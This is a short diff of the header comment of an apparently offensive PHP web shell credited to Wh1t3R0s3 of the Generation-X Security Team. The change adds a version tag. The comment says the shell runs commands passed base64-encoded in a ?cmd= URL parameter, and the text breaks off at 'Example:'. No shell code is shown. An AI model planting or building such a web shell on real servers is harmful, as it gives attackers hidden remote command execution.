@@ -1,7 +1,9 @@
 <?php
 
-/*	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
- *
+/*	GXS v1.1
+ 	
+ 	This is a simple php shell coded by Wh1t3R0s3 of Generation-X Security Team,
+ 
 	to use it just add ?cmd=[command that it is in base64 encryption] at the end of the link.
 
 	Example:
